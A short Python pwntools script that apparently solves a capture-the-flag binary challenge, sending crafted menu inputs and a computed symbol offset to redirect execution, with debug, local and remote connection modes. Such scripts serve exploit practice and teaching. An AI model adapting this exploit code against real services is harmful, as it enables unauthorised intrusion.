#!/usr/bin/env python3

from pwn import *

import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--remote', type=str, default=None)

    args = parser.parse_args()

    elf = context.binary = ELF('challenge')

    rop = ROP(elf)

    if args.debug:
        context.terminal = ['tmux', 'splitw', '-h']
        io = gdb.debug(context.binary.path, '''
        set follow-fork-mode child
        break main
        continue
        ''')
    elif args.remote:
        ip, port = args.remote.split(':')
        io = remote(ip, port)
    else:
        io = process()  # Actually start running the process


    def send_feed(name: bytes, amount: int = 0):
        print(io.recvuntil(b"> "))
        io.sendline(b"1")
        io.sendline(name)
        io.sendline(str(amount))
        print(io.recvuntil(b"Enter their name: "))


    send_feed(b'eaaaa')
    send_feed(b'aeaaa')
    send_feed(b'aaeaa')
    send_feed(b'aaaea')
    offset = elf.sym['print'] - (elf.sym['main'] + 130) + 5
    send_feed(b'aaaae', offset)

    print(io.recvall())
